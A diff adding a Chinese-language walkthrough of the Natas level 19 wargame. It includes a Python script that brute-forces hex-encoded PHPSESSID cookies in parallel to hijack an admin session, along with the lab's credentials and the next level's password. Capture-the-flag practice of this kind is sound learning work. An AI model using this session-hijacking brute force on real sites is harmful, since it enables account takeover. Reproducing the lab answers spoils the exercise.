@@ -628,3 +628,63 @@ with Pool(64) as pool:
 ```text
 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
 ```
+
+###Level19
+没有给源码，提示说
+```text
+This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
+```
+总之先弄几个ID看看吧，拿到了
+```text
+3433302d61646d696e
+3130302d61646d696e
+3237342d61646d696e
+...
+```
+大概是`3x3x3x2d61646d696e`的感觉，剩下的部分跟上一题一样了
+```python
+import socks
+import socket
+socks.set_default_proxy(socks.SOCKS5, "localhost", 23363)
+socket.socket = socks.socksocket
+
+import urllib.request
+import urllib.parse
+from multiprocessing import Pool
+
+url = "http://natas19.natas.labs.overthewire.org/index.php"
+headers = {
+    "Authorization": (
+        "Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw=="
+    ),
+    "Host": "natas19.natas.labs.overthewire.org",
+}
+
+
+def check_password(session_id):
+    session_id = str(session_id)
+    post_dict = {
+        "username": "admin",
+        "password": "admin"
+    }
+    post_data = urllib.parse.urlencode(post_dict).encode('ascii')
+    req = urllib.request.Request(url, post_data, headers)
+    req.add_header(
+        "Cookie",
+        "PHPSESSID=3%s3%s3%s2d61646d696e" % (
+            session_id[0], session_id[1], session_id[2]
+        )
+    )
+    with urllib.request.urlopen(req) as f:
+        body = f.read().decode('utf-8')
+        if body.find("You are an admin.") >= 0:
+            print(session_id)
+
+
+with Pool(64) as pool:
+    pool.map(check_password, range(100, 1000))
+```
+最后拿到natas20的密码
+```text
+eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
+```
